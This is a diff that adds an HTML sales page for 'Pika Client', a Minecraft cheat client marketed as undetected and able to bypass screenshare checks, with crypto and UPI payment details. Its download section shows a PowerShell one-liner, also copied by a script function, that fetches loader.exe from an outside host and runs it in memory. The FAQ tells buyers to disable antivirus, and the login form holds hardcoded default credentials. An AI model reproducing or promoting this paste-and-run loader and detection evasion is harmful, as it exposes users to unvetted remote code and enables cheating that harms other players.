@@ -1,0 +1,704 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pika Client - Glass WebGui</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link rel="stylesheet" href="css/style.css">
+    <script src="config/config.js"></script>
+    
+    <script src="js/1194.js"></script>
+    <script src="js/32424.js"></script>
+    <script src="js/231231.js"></script>
+    <script src="js/85762.js"></script>
+    <script src="js/43901.js"></script>
+    <script src="js/67283.js"></script>
+    <script src="js/91827.js"></script>
+    <script src="js/50321.js"></script>
+    <script src="js/74562.js"></script>
+    <script src="js/11223.js"></script>
+    <script src="js/44556.js"></script>
+    <script src="js/77889.js"></script>
+    <script src="js/99001.js"></script>
+    <script src="js/22334.js"></script>
+    
+    <style>
+        .user-email {
+            color: var(--gradient-end);
+            font-size: 0.9rem;
+            margin-left: 15px;
+            padding: 5px 12px;
+            background: rgba(255,255,255,0.05);
+            border-radius: 20px;
+            border: 1px solid var(--gradient-start);
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+        }
+        .user-email i {
+            color: var(--gradient-start);
+            font-size: 0.8rem;
+        }
+        .nav-right {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .webgui-toggle {
+            color: var(--gradient-start);
+            font-size: 1.2rem;
+            cursor: pointer;
+            padding: 5px 10px;
+            border-radius: 5px;
+            transition: all 0.2s ease;
+            display: none;
+        }
+        .webgui-toggle:hover {
+            background: rgba(255,255,255,0.1);
+            color: var(--gradient-end);
+        }
+        .webgui-toggle.visible {
+            display: inline-block;
+        }
+        .nav-links.hidden {
+            display: none !important;
+        }
+        .nav-links {
+            transition: all 0.3s ease;
+        }
+    </style>
+</head>
+<body>
+    <nav class="navbar">
+        <div class="logo-container">
+            <i class="fas fa-crown" style="color: #8f9cc9;"></i>
+            <div class="logo">Pika<span style="color: #8f9cc9;">Client</span></div>
+        </div>
+        <span class="webgui-toggle" id="webguiToggle" onclick="toggleWebguiNav()">
+            <i class="fas fa-chevron-up" id="toggleIcon"></i>
+        </span>
+        <ul class="nav-links" id="navLinks">
+            <li><a href="#" id="homeLink">Home</a></li>
+            <li><a href="#" id="productsLink">Products</a></li>
+            <li><a href="#" id="downloadLink" class="hidden">Download</a></li>
+            <li><a href="#" id="webguiLink" class="hidden">WebGui</a></li>
+            <li><a href="#" id="faqLink">FAQ</a></li>
+            <li><a href="#" id="authLink">Login/Register</a></li>
+            <li><a href="#" id="licenseLink">Redeem License</a></li>
+        </ul>
+        <div class="nav-right">
+            <div id="userEmailDisplay" class="user-email" style="display: none;">
+                <i class="fas fa-user-circle"></i>
+                <span id="userEmailText"></span>
+            </div>
+            <div class="hamburger" onclick="toggleMenu()">
+                <div class="bar"></div>
+                <div class="bar"></div>
+                <div class="bar"></div>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Payment Modal -->
+    <div id="paymentModal" class="modal">
+        <div class="modal-content">
+            <span class="close-modal" onclick="closePaymentModal()">&times;</span>
+            <h2 style="color: var(--gradient-start); margin-bottom: 1rem;" id="modalTitle">Choose Payment Method</h2>
+            <p style="color: var(--darker-text); margin-bottom: 1rem;" id="modalProduct">Pika Monthly - $5</p>
+            
+            <div class="payment-options" id="paymentOptions">
+                <div class="payment-option" onclick="showLitecoinPayment()">
+                    <i class="fab fa-bitcoin"></i>
+                    <div>
+                        <h3 style="color: white;">LiteCoin</h3>
+                        <p style="color: var(--darker-text); font-size: 0.9rem;">Pay with LiteCoin</p>
+                    </div>
+                </div>
+                <div class="payment-option" onclick="showUPIPayment()">
+                    <i class="fas fa-mobile-alt"></i>
+                    <div>
+                        <h3 style="color: white;">UPI (India)</h3>
+                        <p style="color: var(--darker-text); font-size: 0.9rem;">Pay with UPI</p>
+                    </div>
+                </div>
+            </div>
+
+            <div id="paymentDetails" style="display: none;">
+                <div id="litecoinDetails" style="display: none;">
+                    <h3 style="color: var(--gradient-start); margin-bottom: 1rem;">LiteCoin Payment</h3>
+                    <div class="payment-details">
+                        ltc1qkuwx9ktsskk5syp3hgw8tvn0vpcwavjcmnnaku
+                    </div>
+                    <div class="payment-note">
+                        <i class="fas fa-info-circle"></i> After payment, DM <strong>wwbyp</strong> on Discord with your transaction ID and you will receive your license key.
+                    </div>
+                </div>
+                
+                <div id="upiDetails" style="display: none;">
+                    <h3 style="color: var(--gradient-start); margin-bottom: 1rem;">UPI Payment</h3>
+                    <div class="payment-details" style="text-align: center;">
+                        <img src="img/image.jpg" alt="UPI QR Code" style="max-width: 100%; height: auto; border-radius: 12px; margin-bottom: 15px;">
+                        <p style="color: var(--darker-text);">Scan this QR code with any UPI app</p>
+                    </div>
+                    <div class="payment-note">
+                        <i class="fas fa-info-circle"></i> After payment, DM <strong>wwbyp</strong> on Discord with your transaction ID and you will receive your license key.
+                    </div>
+                </div>
+                
+                <button class="auth-btn" style="margin-top: 1rem;" onclick="backToPaymentOptions()">Back to Options</button>
+            </div>
+        </div>
+    </div>
+
+    <div class="main-wrapper">
+        <!-- HOME page -->
+        <section id="home" class="page active-page">
+            <div class="hero">
+                <div class="hero-content">
+                    <h1>Pika</h1>
+                    <h2>The Future of bypassing, GhostClients</h2>
+                    <p>
+                        Screenshare bypass, multiversion webgui and much more!
+                    </p>
+                    <div class="hero-buttons">
+                        <a href="#" id="heroProductsBtn" class="cta-button">View Products</a>
+                        <a href="#" id="heroDownloadBtn" class="cta-button secondary">Download</a>
+                    </div>
+                </div>
+            </div>
+
+            <h2 class="section-title">Why Choose Pika?</h2>
+            <div class="features-grid">
+                <div class="feature-card">
+                    <div class="feature-title">Undetected</div>
+                    <div class="feature-description">
+                        Pika products use the latest and most secure methods in their modules.
+                        Being detected isn't on our list of concerns.
+                    </div>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-title">Screenshare Bypass</div>
+                    <div class="feature-description">
+                        Pika is guaranteed screenshare proof when following our screenshare guide.
+                    </div>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-title">New instance</div>
+                    <div class="feature-description">
+                        Pika supports keybind injection. Never get caught on new instance.
+                    </div>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-title">WebGui</div>
+                    <div class="feature-description">
+                        Pika has WebGui instead of normal clickgui which you will get after buying.
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- PRODUCTS page -->
+        <section id="products" class="page">
+            <h2 class="section-title">Choose your product</h2>
+            <div class="product-grid">
+                <div class="product-card">
+                    <div class="product-name">Pika Monthly</div>
+                    <div class="product-price">$5.00</div>
+                    <div class="product-badge">30 days - auto updates</div>
+                    <ul class="feature-list">
+                        <li>Bypasses full manual screenshare including scanners</li>
+                        <li>Fileless execution & injection</li>
+                        <li>supports multi versions 1.19x-26.2 fabric,vanilla and feather</li>
+                        <li>New instance bypass</li>
+                        <li>WebGui (nevergetcaught.xyz)</li>
+                        <li>Mainly for sword, pot and prob for mace</li>
+                    </ul>
+                    <button class="btn-placeholder" onclick="openPaymentModal('monthly')">Subscribe Monthly</button>
+                </div>
+                <div class="product-card">
+                    <div class="product-name">Pika Lifetime</div>
+                    <div class="product-price">$15.00</div>
+                    <div class="product-badge">lifetime - no renewal</div>
+                    <ul class="feature-list">
+                        <li>Bypasses full manual screenshare including scanners</li>
+                        <li>Fileless execution & injection</li>
+                        <li>supports 1.19x-26.2 fabric,vanilla and feather</li>
+                        <li>New instance bypass</li>
+                        <li>WebGui (nevergetcaught.xyz)</li>
+                        <li>Mainly for sword, pot and prob for mace</li>
+                    </ul>
+                    <button class="btn-placeholder" onclick="openPaymentModal('lifetime')">Get Lifetime</button>
+                </div>
+            </div>
+        </section>
+
+        <!-- DOWNLOAD page -->
+        <section id="download" class="page">
+            <div class="download-panel" style="max-width: 900px;">
+                <h2 style="margin-bottom: 30px;">obtain Pika</h2>
+                
+                <div style="display: flex; gap: 30px; margin: 20px 0; flex-wrap: wrap; justify-content: center;">
+                    <!-- Fileless Injection Card -->
+                    <div style="flex: 1; min-width: 300px; background: var(--dark-element); border: 1px solid var(--gradient-start); border-radius: 24px; padding: 30px; text-align: center;">
+                        <div style="font-size: 3rem; color: var(--gradient-start); margin-bottom: 20px;">
+                            <i class="fas fa-terminal"></i>
+                        </div>
+                        <h3 style="color: var(--gradient-start); margin-bottom: 20px; font-size: 1.8rem; font-weight: 600;">Fileless Injection</h3>
+                        <div style="background: #0a0a0a; border: 1px solid #2a2a3a; border-radius: 12px; padding: 20px; margin-bottom: 20px; text-align: left;">
+                            <code style="color: #b0c4e0; font-size: 0.85rem; word-break: break-all; display: block; font-family: 'Courier New', monospace; line-height: 1.5;">
+                                [System.Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('https://nevergetcaught.xyz/loader.exe')).EntryPoint.Invoke($null, $null)
+                            </code>
+                        </div>
+                        <button class="auth-btn" onclick="copyFilelessCommand()" style="background: transparent; border: 2px solid var(--gradient-start); color: var(--gradient-start); width: 100%;">
+                            <i class="fas fa-copy"></i> Copy Command
+                        </button>
+                    </div>
+
+                    <!-- Loader Download Card -->
+                    <div style="flex: 1; min-width: 300px; background: var(--dark-element); border: 1px solid #2d2d4a; border-radius: 24px; padding: 30px; text-align: center;">
+                        <div style="font-size: 3rem; color: var(--gradient-start); margin-bottom: 20px;">
+                            <i class="fas fa-download"></i>
+                        </div>
+                        <h3 style="color: var(--gradient-start); margin-bottom: 20px; font-size: 1.8rem; font-weight: 600;">Loader</h3>
+                        <div style="background: #0a0a0a; border: 1px solid #2a2a3a; border-radius: 12px; padding: 20px; margin-bottom: 20px;">
+                            <a href="https://nevergetcaught.xyz/loader.exe" download style="color: var(--gradient-start); text-decoration: none; font-size: 1.1rem; word-break: break-all;">
+                                Download Loader
+                            </a>
+                        </div>
+                        <a href="https://nevergetcaught.xyz/loader.exe" download class="auth-btn" style="background: linear-gradient(135deg, var(--gradient-start) 0%, var(--gradient-end) 100%); color: white; width: 100%; text-decoration: none; display: inline-block; text-align: center;">
+                            <i class="fas fa-download"></i> Download
+                        </a>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- WebGui page -->
+        <section id="webgui" class="page">
+            <div id="connection-status" class="connection-pill">
+                <div class="connection-dot"></div>
+                <span class="connection-text">Connecting...</span>
+            </div>
+
+            <div id="login-screen" class="screen">
+                <div class="login-container">
+                    <div class="login-card">
+                        <div class="login-logo">
+                            <span class="logo-text">Pika Injection</span>
+                        </div>
+                        <h2 class="login-title">Web GUI Login</h2>
+
+                        <div id="hardware-panel" class="hardware-panel">
+                            <div class="hardware-row">
+                                <span class="hardware-label">Hardware Status</span>
+                                <span class="hardware-badge" id="hwStatus">Checking...</span>
+                            </div>
+                            <div class="hardware-id" id="hwId">Loading...</div>
+                        </div>
+
+                        <div id="login-error" class="error-message hidden"></div>
+
+                        <form id="login-form" class="login-form">
+                            <div class="input-group">
+                                <input type="text" id="username" placeholder="Username" value="3Qi" required>
+                            </div>
+                            <div class="input-group">
+                                <input type="password" id="password" placeholder="Password" value="Admin3Qi" required>
+                            </div>
+                            <button type="submit" id="loginBtn" class="login-btn">Access Pika</button>
+                        </form>
+
+                        <div class="server-status">
+                            <button id="refresh-connection" class="refresh-btn">Refresh Connection</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div id="main-screen" class="screen hidden">
+                <div class="gui-container">
+                    <div class="gui-sidebar">
+                        <div class="sidebar-header">
+                            <span class="logo-text">Pika Injection</span>
+                            <div class="hw-id" id="sidebarHwId">Loading...</div>
+                        </div>
+
+                        <div class="category-tabs" id="categoryTabs">
+                            <button class="category-tab active" data-category="all">All Modules</button>
+                            <button class="category-tab" data-category="combat">Combat</button>
+                            <button class="category-tab" data-category="movement">Movement</button>
+                            <button class="category-tab" data-category="utility">Utility</button>
+                            <button class="category-tab" data-category="visual">Visual</button>
+                            <button class="category-tab" data-category="misc">Misc</button>
+                        </div>
+
+                        <div class="sidebar-footer">
+                            <div class="status" id="authStatus">
+                                <div class="status-dot"></div>
+                                <span class="status-text">Checking...</span>
+                            </div>
+                            <div class="stats" id="moduleStats">
+                                <span id="moduleCount">0 modules</span> / 
+                                <span id="enabledCount">0 enabled</span>
+                            </div>
+                            <div class="theme-indicator" id="currentThemeIndicator">Theme: Default</div>
+                        </div>
+                    </div>
+
+                    <div class="gui-main">
+                        <div class="main-header">
+                            <div class="header-left">
+                                <div class="logo-small">Pika</div>
+                                <div class="config-controls">
+                                    <button class="config-btn" onclick="webguiApp.toggleConfigDropdown()">
+                                        <span class="btn-icon"><i class="fas fa-folder-open"></i></span>
+                                        <span class="btn-text">Load</span>
+                                    </button>
+                                    <button class="config-btn primary" onclick="webguiApp.showConfigNameModal()">
+                                        <span class="btn-icon"><i class="fas fa-save"></i></span>
+                                        <span class="btn-text">Save</span>
+                                    </button>
+                                    <div id="configDropdown" class="config-dropdown" style="display: none;">
+                                        <div class="dropdown-header">Saved Configurations</div>
+                                        <div class="dropdown-content" id="configList">
+                                            <div class="loading-spinner"></div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="current-config" id="currentConfigDisplay">
+                                    <span class="config-label">Config:</span>
+                                    <span class="config-value">Loading...</span>
+                                </div>
+                            </div>
+                            <div class="header-right">
+                                <div class="search-box">
+                                    <input type="text" id="searchInput" placeholder="Search modules...">
+                                </div>
+                                <div class="header-actions">
+                                    <button class="header-btn" onclick="webguiApp.showConfigManager()">
+                                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor">
+                                            <path d="M12 15.5A3.5 3.5 0 0 1 8.5 12 3.5 3.5 0 0 1 12 8.5a3.5 3.5 0 0 1 3.5 3.5 3.5 3.5 0 0 1-3.5 3.5zm7.43-2.53c.04-.32.07-.64.07-.97s-.03-.66-.07-.98l2.11-1.63c.19-.15.24-.42.12-.64l-2-3.46c-.12-.22-.39-.31-.61-.22l-2.49 1c-.52-.39-1.06-.73-1.69-.98l-.37-2.65c-.04-.24-.25-.42-.5-.42h-4c-.25 0-.46.18-.5.42l-.37 2.65c-.63.25-1.17.59-1.69.98l-2.49-1c-.22-.09-.49 0-.61.22l-2 3.46c-.12.22-.07.49.12.64l2.11 1.63c-.04.32-.07.64-.07.97s.03.66.07.98l-2.11 1.63c-.19.15-.24.42-.12.64l2 3.46c.12.22.39.31.61.22l2.49-1c.52.39 1.06.73 1.69.98l.37 2.65c.04.24.25.42.5.42h4c.25 0 .46-.18.5-.42l.37-2.65c.63-.25 1.17-.59 1.69-.98l2.49-1c.22.09.49 0 .61-.22l2-3.46c.12-.22.07-.49-.12-.64l-2.11-1.63z"/>
+                                        </svg>
+                                        <span>Config</span>
+                                    </button>
+                                    <button class="header-btn" onclick="webguiApp.showThemeManager()">
+                                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor">
+                                            <path d="M12 20a8 8 0 1 0 0-16 8 8 0 0 0 0 16zm0 2a10 10 0 1 1 0-20 10 10 0 0 1 0 20zm0-6.5a3.5 3.5 0 1 1 0-7 3.5 3.5 0 0 1 0 7z"/>
+                                        </svg>
+                                        <span>Themes</span>
+                                    </button>
+                                    <button class="header-btn" onclick="webguiApp.showConfigHub()">
+                                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor">
+                                            <path d="M4 16l4-4-4-4M12 4h8M12 12h8M12 20h8" stroke-width="2" stroke-linecap="round"/>
+                                            <path d="M8 12H2" stroke-width="2" stroke-linecap="round"/>
+                                        </svg>
+                                        <span>Config Hub</span>
+                                    </button>
+                                    <button class="header-btn logout" onclick="webguiApp.logout()">
+                                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor">
+                                            <path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4 M16 17l5-5-5-5 M21 12H9"/>
+                                        </svg>
+                                    </button>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="content-area">
+                            <div id="modulesContainer" class="modules-container">
+                                <div class="loading-state">
+                                    <div class="loader"></div>
+                                    <p>Loading modules...</p>
+                                </div>
+                            </div>
+
+                            <div id="configmanagerContainer" class="configmanager-container hidden">
+                                <div class="configmanager-section">
+                                    <div class="config-section">
+                                        <h2>Config Manager</h2>
+                                        <p class="section-description">Share and import configurations</p>
+                                    </div>
+
+                                    <div class="config-card">
+                                        <div class="config-card-header">
+                                            <h3>Generate Config Key</h3>
+                                            <p>Create a shareable key with your settings</p>
+                                        </div>
+                                        <div class="config-card-content">
+                                            <button class="config-btn primary" onclick="webguiApp.generateConfigKey()">Generate Key</button>
+                                            <div id="keyDisplay" class="key-display" style="display: none;">
+                                                <div class="key-header">Your Config Key:</div>
+                                                <div class="key-value" id="configKeyText"></div>
+                                                <div class="key-actions">
+                                                    <button class="config-btn small" onclick="webguiApp.copyConfigKey()">Copy</button>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+
+                                    <div class="config-card">
+                                        <div class="config-card-header">
+                                            <h3>Import Config</h3>
+                                            <p>Enter a config key from another user</p>
+                                        </div>
+                                        <div class="config-card-content">
+                                            <div class="input-group">
+                                                <input type="text" id="importKey" placeholder="Enter 6-character key" maxlength="6">
+                                                <button class="config-btn success" onclick="webguiApp.importConfig()">Import</button>
+                                            </div>
+                                            <div id="importResult" class="import-result hidden"></div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div id="themesContainer" class="themes-container hidden">
+                                <div class="themes-section">
+                                    <div class="theme-section">
+                                        <h2>Theme Manager</h2>
+                                        <p class="section-description">Customize your GUI appearance</p>
+                                    </div>
+
+                                    <div class="theme-grid" id="themeGrid"></div>
+                                </div>
+                            </div>
+
+                            <!-- Config Hub Container -->
+                            <div id="confighubContainer" class="confighub-container hidden">
+                                <div class="confighub-section">
+                                    <div class="confighub-header">
+                                        <h2><i class="fas fa-cloud-download-alt"></i> Config Hub</h2>
+                                        <p class="section-description">Download community-shared configurations directly to your client</p>
+                                    </div>
+                                    <div id="configHubList" class="config-hub-grid">
+                                        <div class="loading-state">
+                                            <div class="loader"></div>
+                                            <p>Loading available configs...</p>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div id="configNameModal" class="modal-overlay hidden">
+                <div class="modal-card">
+                    <div class="modal-header">
+                        <h3>Save Configuration</h3>
+                        <button class="modal-close" onclick="webguiApp.hideConfigNameModal()">x</button>
+                    </div>
+                    <div class="modal-body">
+                        <input type="text" id="configNameInput" class="modal-input" placeholder="Enter config name...">
+                    </div>
+                    <div class="modal-footer">
+                        <button class="modal-btn secondary" onclick="webguiApp.hideConfigNameModal()">Cancel</button>
+                        <button class="modal-btn primary" onclick="webguiApp.saveNamedConfig()">Save</button>
+                    </div>
+                </div>
+            </div>
+
+            <div id="notification" class="notification hidden"></div>
+        </section>
+
+        <!-- FAQ page -->
+        <section id="faq" class="page">
+            <h2 class="section-title">Frequently Asked Questions</h2>
+            <div class="faq-grid">
+                <div class="faq-item">
+                    <div class="faq-question">What operating system does Pika support?</div>
+                    <div class="faq-answer">Pika Client is built for Windows 10/11 64 bit.</div>
+                </div>
+                <div class="faq-item">
+                    <div class="faq-question">Can I share my account with a friend?</div>
+                    <div class="faq-answer">No. Sharing or selling your account will result in it being suspended.</div>
+                </div>
+                <div class="faq-item">
+                    <div class="faq-question">Pika is not working. What to do?</div>
+                    <div class="faq-answer">
+                        If the client is not opening, please try the following:
+                        <ul>
+                            <li>Make sure you are using the latest version of the client.</li>
+                            <li>Make sure you are using a supported version of Minecraft.</li>
+                            <li>Disable anti-virus software temporarily.</li>
+                            <li>If none of the above works, create a ticket on discord.</li>
+                        </ul>
+                    </div>
+                </div>
+                <div class="faq-item">
+                    <div class="faq-question">What payment methods can I use?</div>
+                    <div class="faq-answer">LiteCoin and UPI (for Indians). Click on Subscribe Monthly or Get Lifetime to see payment details.</div>
+                </div>
+            </div>
+        </section>
+
+        <!-- LOGIN/REGISTER page -->
+        <section id="auth" class="page">
+            <div class="auth-container">
+                <div class="form-container login-form active-form">
+                    <h2><i class="fas fa-lock" style="color: #8f9cc9;"></i> Login</h2>
+                    <form id="loginForm">
+                        <div class="input-group">
+                            <i class="fas fa-envelope"></i>
+                            <input type="email" id="loginEmail" placeholder="Email" required>
+                        </div>
+                        <div class="input-group">
+                            <i class="fas fa-key"></i>
+                            <input type="password" id="loginPassword" placeholder="Password" required>
+                        </div>
+                        <div class="form-options">
+                            <label>
+                                <input type="checkbox"> Remember me
+                            </label>
+                            <a href="#" class="forgot-password">Forgot Password?</a>
+                        </div>
+                        <button type="submit" class="auth-btn">Login</button>
+                    </form>
+                    <p class="switch-form">
+                        Don't have an account? <a href="#" id="registerLink">Register here</a>
+                    </p>
+                </div>
+
+                <div class="form-container register-form">
+                    <h2><i class="fas fa-user-plus" style="color: #8f9cc9;"></i> Register</h2>
+                    <form id="registerForm">
+                        <div class="input-group">
+                            <i class="fas fa-user"></i>
+                            <input type="text" id="regName" placeholder="Full Name" required>
+                        </div>
+                        <div class="input-group">
+                            <i class="fas fa-envelope"></i>
+                            <input type="email" id="regEmail" placeholder="Email" required>
+                        </div>
+                        <div class="input-group">
+                            <i class="fas fa-key"></i>
+                            <input type="password" id="regPassword" placeholder="Password" required>
+                        </div>
+                        <div class="input-group">
+                            <i class="fas fa-key"></i>
+                            <input type="password" id="regConfirmPassword" placeholder="Confirm Password" required>
+                        </div>
+                        <div class="form-options">
+                            <label>
+                                <input type="checkbox" required> I agree to the Terms & Conditions
+                            </label>
+                        </div>
+                        <button type="submit" class="auth-btn">Register</button>
+                    </form>
+                    <p class="switch-form">
+                        Already have an account? <a href="#" id="loginLink">Login here</a>
+                    </p>
+                </div>
+            </div>
+
+            <div class="dashboard hidden" id="dashboard">
+                <div class="dashboard-header">
+                    <i class="fas fa-check-circle" style="color: #8f9cc9; font-size: 3rem;"></i>
+                    <h2>Welcome to Your Dashboard</h2>
+                    <p>You have successfully logged in!</p>
+                </div>
+                <div class="dashboard-content">
+                    <div class="stats-grid">
+                        <div class="stat-card">
+                            <i class="fas fa-users"></i>
+                            <h3>Profile</h3>
+                            <p id="userName">User Name</p>
+                        </div>
+                        <div class="stat-card">
+                            <i class="fas fa-envelope"></i>
+                            <h3>Email</h3>
+                            <p id="userEmail">user@example.com</p>
+                        </div>
+                        <div class="stat-card">
+                            <i class="fas fa-calendar"></i>
+                            <h3>Member Since</h3>
+                            <p id="memberSince">Just now</p>
+                        </div>
+                    </div>
+                    <button class="logout-btn" id="logoutBtn">Logout</button>
+                </div>
+            </div>
+        </section>
+
+        <!-- LICENSE REDEMPTION page -->
+        <section id="license" class="page">
+            <div class="license-section">
+                <i class="fas fa-key" style="font-size: 3rem; color: var(--gradient-start); margin-bottom: 1rem;"></i>
+                <h3>Redeem Your License</h3>
+                <p>Enter your license key below to unlock the Download section.</p>
+                <div class="license-input-group">
+                    <input type="text" id="licenseKey" placeholder="Enter your license key">
+                    <button class="license-btn" id="redeemBtn">Redeem</button>
+                </div>
+                <div id="licenseStatus" class="license-status"></div>
+            </div>
+        </section>
+    </div>
+
+    <div class="toast" id="toast"></div>
+
+    <footer class="footer">
+        <div class="copyright">
+            <p>© 2026 Pika. All rights reserved.</p>
+        </div>
+    </footer>
+
+    <script src="js/42942.js"></script>
+    <script src="js/74923.js"></script>
+    <script>
+        function copyFilelessCommand() {
+            const command = '[System.Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData(\'https://nevergetcaught.xyz/loader.exe\')).EntryPoint.Invoke($null, $null)';
+            navigator.clipboard.writeText(command).then(() => {
+                showToast('Command copied to clipboard!', 'success');
+            }).catch(() => {
+                showToast('Failed to copy command', 'error');
+            });
+        }
+        window.copyFilelessCommand = copyFilelessCommand;
+
+        const webguiToggle = document.getElementById('webguiToggle');
+        const navLinks = document.getElementById('navLinks');
+        const toggleIcon = document.getElementById('toggleIcon');
+
+        function toggleWebguiNav() {
+            navLinks.classList.toggle('hidden');
+            if (navLinks.classList.contains('hidden')) {
+                toggleIcon.className = 'fas fa-chevron-down';
+            } else {
+                toggleIcon.className = 'fas fa-chevron-up';
+            }
+        }
+
+        function updateWebguiToggle() {
+            const currentPage = document.querySelector('.page.active-page');
+            if (currentPage && currentPage.id === 'webgui') {
+                webguiToggle.classList.add('visible');
+            } else {
+                webguiToggle.classList.remove('visible');
+                navLinks.classList.remove('hidden');
+                toggleIcon.className = 'fas fa-chevron-up';
+            }
+        }
+
+        const originalShowPage = window.showPage || function(){};
+        window.showPage = function(pageId) {
+            if (typeof originalShowPage === 'function') {
+                originalShowPage(pageId);
+            }
+            setTimeout(updateWebguiToggle, 100);
+        };
+
+        document.addEventListener('DOMContentLoaded', updateWebguiToggle);
+        
+        const observer = new MutationObserver(updateWebguiToggle);
+        observer.observe(document.body, { 
+            attributes: true, 
+            attributeFilter: ['class'],
+            subtree: true 
+        });
+
+        window.toggleWebguiNav = toggleWebguiNav;
+    </script>
+</body>
+</html>
